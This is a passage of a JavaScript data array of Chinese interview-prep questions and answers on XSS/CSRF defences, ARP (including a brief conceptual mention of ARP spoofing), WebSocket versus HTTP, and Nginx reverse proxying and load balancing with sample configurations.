        <li><strong>CSRF</strong>：<strong>借用用户身份</strong>（Cookie）发请求。攻击用户在另一站点的登录态。</li>
        <li>常一起：XSS 偷 Token 配合 CSRF。</li>
      </ul>
      <p><strong>4. 面试标准答法</strong></p>
      <p>XSS注入恶意JS(反射/存储/DOM)，窃取Cookie。防御：输出转义、CSP、HttpOnly Cookie。CSRF利用用户登录态(Cookie)诱导发请求(转账)。防御：CSRF Token(最有效)、Referer校验、SameSite Cookie、敏感操作二次确认。XSS偷信息，CSRF借用身份。</p>`},
  {c:"网络",d:"★",q:"ARP 协议是做什么的？",
   a:`<p><strong>ARP（Address Resolution Protocol）地址解析协议</strong>，作用是把 <strong>IP 地址解析成 MAC 地址</strong>。</p>
      <p>过程：主机要发数据给同网段的某 IP，先查 ARP 缓存表，没有就广播 ARP 请求（"谁是这个 IP？"），目标 IP 的主机会单播回复自己的 MAC 地址，发送方缓存下来。</p>
      <blockquote>数据链路层靠 MAC 地址传输，网络层靠 IP，ARP 是两者之间的桥梁。RARP 反过来，MAC→IP。</blockquote>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. ARP 的作用</strong></p>
      <p>把<strong>IP 地址解析成 MAC 地址</strong>。网络层用 IP（跨网段寻址），数据链路层（以太网）用 MAC（同网段传输）。ARP 是两者之间的桥梁。</p>
      <p><strong>2. 工作过程</strong></p>
      <ol>
        <li>主机 A 要给同网段的 B（IP 192.168.1.5）发数据。</li>
        <li>A 查<strong>ARP 缓存表</strong>（IP→MAC 映射）。有就直接用。</li>
        <li>没有，A <strong>广播 ARP 请求</strong>（目的 MAC 全1）："谁的 IP 是 192.168.1.5？把你的 MAC 告诉 192.168.1.1"。同网段所有主机都收到。</li>
        <li>B 收到，发现是问自己，<strong>单播回复 ARP 应答</strong>："192.168.1.5 的 MAC 是 xx:xx:xx:xx:xx:xx"。</li>
        <li>A 收到，存入 ARP 缓存（有 TTL），之后直接用这个 MAC 发以太网帧。</li>
      </ol>
      <p><strong>3. ARP 缓存</strong></p>
      <p>每台主机维护 ARP 表（IP→MAC），避免每次广播。有过期时间（如 20 分钟）。arp -a 查看。</p>
      <p><strong>4. 跨网段的情况</strong></p>
      <p>跨网段时，A 把数据发给<strong>网关（路由器）</strong>（ARP 解析网关的 MAC），网关再转发。所以 ARP 解析的是"下一跳"的 MAC。</p>
      <p><strong>5. ARP 欺骗（攻击）</strong></p>
      <p>攻击者伪造 ARP 应答（"我是网关，MAC 是攻击者的"），让受害者的流量发给攻击者（中间人）。防御：静态 ARP 绑定、ARP 检测（交换机）。</p>
      <p><strong>6. RARP</strong></p>
      <p>逆地址解析：MAC→IP。无盘工作站启动时用（知道自己的 MAC 不知道 IP）。现在基本不用（用 DHCP）。</p>
      <p><strong>7. 面试标准答法</strong></p>
      <p>ARP把IP解析成MAC(网络层IP→链路层MAC)。过程：查ARP缓存→没缓存则广播ARP请求→目标单播回复MAC→缓存。跨网段解析下一跳(网关)MAC。ARP欺骗：伪造应答中间人。RARP反过来MAC→IP。</p>`},
  {c:"网络",d:"★",q:"WebSocket 是什么？和 HTTP 有什么区别？",
   a:`<p><strong>WebSocket</strong> 是一种<strong>全双工</strong>通信协议，服务器和客户端可以随时互发消息，适合实时场景（聊天、推送、股票行情）。</p>
      <p>和 HTTP 的区别：</p>
      <ul>
        <li>HTTP 是<strong>请求-响应</strong>模式，单向（客户端发起）；WebSocket 是<strong>双向</strong>的，服务器能主动推送。</li>
        <li>WebSocket 建立在 HTTP 之上（先 HTTP 握手升级成 WebSocket），之后用同一连接双向通信。</li>
        <li>WebSocket 连接保持长开，开销小；HTTP 每次请求可能新建连接（虽然长连接也行）。</li>
      </ul>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. WebSocket 是什么</strong></p>
      <p>HTML5 引入的<strong>全双工</strong>（双向同时）通信协议。建立在 TCP 上，一个连接建立后，<strong>服务器和客户端都能随时主动发消息</strong>。适合<strong>实时</strong>场景：聊天、推送通知、股票行情、协同编辑、多人游戏。</p>
      <p><strong>2. 和 HTTP 的区别</strong></p>
      <table><tr><th></th><th>HTTP</th><th>WebSocket</th></tr>
      <tr><td>通信模式</td><td>请求-响应（客户端发起）</td><td>全双工（双向主动）</td></tr>
      <tr><td>方向</td><td>单向（客户端→服务器请求，服务器响应）</td><td>双向（双方都能主动发）</td></tr>
      <tr><td>服务器推送</td><td>不行（要轮询/SSE）</td><td>可以主动推送</td></tr>
      <tr><td>连接</td><td>短/长连接（仍请求-响应）</td><td>长连接保持</td></tr>
      <tr><td>头部开销</td><td>每次请求带完整 Header</td><td>握手后数据帧头部极小（2-10字节）</td></tr></table>
      <p><strong>3. WebSocket 的建立过程</strong></p>
      <p>WebSocket 复用 HTTP 端口（80/443）：</p>
      <ol>
        <li>客户端发<strong>HTTP 请求</strong>带 Upgrade: websocket、Connection: Upgrade、Sec-WebSocket-Key 等。</li>
        <li>服务器返回 HTTP 101 Switching Protocols，带 Sec-WebSocket-Accept。</li>
        <li><strong>握手成功后，连接升级为 WebSocket</strong>，之后双方用 WebSocket 帧通信（不再是 HTTP）。</li>
        <li>连接保持，双方随时发数据（文本/二进制帧）。</li>
        <li>任一方可发 Close 帧关闭。</li>
      </ol>
      <p><strong>4. 对比其他实时方案</strong></p>
      <ul>
        <li><strong>HTTP 轮询</strong>：客户端定时发请求查新消息。简单但费资源（大量空请求）、延迟高。</li>
        <li><strong>长轮询（Long Polling）</strong>：客户端发请求，服务器 hold 住有消息才返回，客户端立即再发。比轮询省，但仍是一次次 HTTP。</li>
        <li><strong>SSE（Server-Sent Events）</strong>：服务器单向推送（HTTP 长连接）。只能服务器→客户端。</li>
        <li><strong>WebSocket</strong>：全双工，最实时高效。复杂场景首选。</li>
      </ul>
      <p><strong>5. 面试标准答法</strong></p>
      <p>WebSocket是全双工协议，服务器能主动推送，适合实时(聊天/推送)。区别HTTP(请求-响应单向)：WebSocket双向、长连接、头部小。建立：HTTP请求Upgrade:websocket→101 Switching→升级为WebSocket帧通信。比轮询/长轮询/SSE更实时。</p>`},
  {c:"网络",d:"★★",q:"Nginx 怎么做反向代理和负载均衡？",
   a:`<p><strong>反向代理</strong>：客户端访问 Nginx，Nginx 把请求转发给后端真实服务器，对客户端隐藏了真实服务器。</p>
      <p><strong>负载均衡</strong>配置（upstream）：</p>
      <pre><code>upstream backend {
    server 192.168.1.1:8080 weight=3;
    server 192.168.1.2:8080;
}</code></pre>
      <p>负载均衡算法：</p>
      <ul>
        <li><strong>轮询</strong>（默认）：按顺序依次分配。</li>
        <li><strong>加权轮询</strong>（weight）：性能好的权重高，分得多。</li>
        <li><strong>ip_hash</strong>：同一 IP 固定到同一服务器（会话保持）。</li>
        <li><strong>least_conn</strong>：分配给当前连接数最少的。</li>
      </ul>`,
   b:`<h5>📐 八股文详解</h5>
      <p><strong>1. Nginx 的角色</strong></p>
      <p>Nginx 是高性能的 Web 服务器 / 反向代理 / 负载均衡器。常用作：① 静态资源服务；② 反向代理；③ 负载均衡；④ API 网关。</p>
      <p><strong>2. 反向代理配置</strong></p>
      <pre><code>server {
    listen 80;
    server_name www.example.com;
    location / {
        proxy_pass http://backend;  # 转发到 upstream
        proxy_set_header Host $host;  # 透传 Header
        proxy_set_header X-Real-IP $remote_addr;
    }
    location /api/ {
        proxy_pass http://api-server;
    }
    location ~* \\.(jpg|css|js)$ {
        root /var/www/static;  # 静态资源直接返回
    }
}</code></pre>
      <p>客户端访问 Nginx，Nginx 按 location 规则转发到后端（proxy_pass）。对客户端透明（只看到 Nginx）。</p>
      <p><strong>3. 负载均衡（upstream）</strong></p>
      <pre><code>upstream backend {
    server 192.168.1.1:8080 weight=3 max_fails=3 fail_timeout=30s;
    server 192.168.1.2:8080 weight=1;
    server 192.168.1.3:8080 backup;  # 备用
    # ip_hash;  # 或 least_conn;
}</code></pre>
      <p>server 参数：weight（权重）、max_fails（失败次数）、fail_timeout（熔断时间）、backup（备用）、down（停用）。</p>
      <p><strong>4. 负载均衡算法</strong></p>
      <ul>
        <li><strong>轮询 Round Robin（默认）</strong>：按顺序 1→2→3→1...。简单平均。</li>
        <li><strong>加权轮询 Weighted Round Robin</strong>：weight 越大分越多。性能差异时用。</li>
        <li><strong>ip_hash</strong>：按客户端 IP hash 固定到同一后端（会话保持 Session Sticky）。缺点：后端增减会重映射、负载不均。</li>
        <li><strong>least_conn</strong>：分配给当前活跃连接最少的。动态。</li>
        <li><strong>hash $request_uri</strong>：按 URL hash（缓存场景）。</li>
        <li>第三方：fair（按响应速度）、consistent_hash（一致性哈希）。</li>
      </ul>
      <p><strong>5. 其他常用功能</strong></p>
      <ul>
        <li><strong>SSL 卸载</strong>：HTTPS 在 Nginx 解密，后端用 HTTP。</li>
        <li><strong>限流</strong>：limit_req（请求速率）、limit_conn（连接数）。</li>
        <li><strong>缓存</strong>：proxy_cache 缓存后端响应。</li>
        <li><strong>Gzip 压缩</strong>：压缩响应省带宽。</li>
        <li><strong>跨域 CORS</strong>：加响应头。</li>
      </ul>
      <p><strong>6. 面试标准答法</strong></p>
      <p>Nginx做反向代理(proxy_pass转发到upstream)和负载均衡。算法：轮询(默认)、加权轮询(weight)、ip_hash(会话保持)、least_conn(最少连接)。server配置weight/max_fails/backup。还做SSL卸载、限流(limit_req)、缓存、静态资源。</p>`},
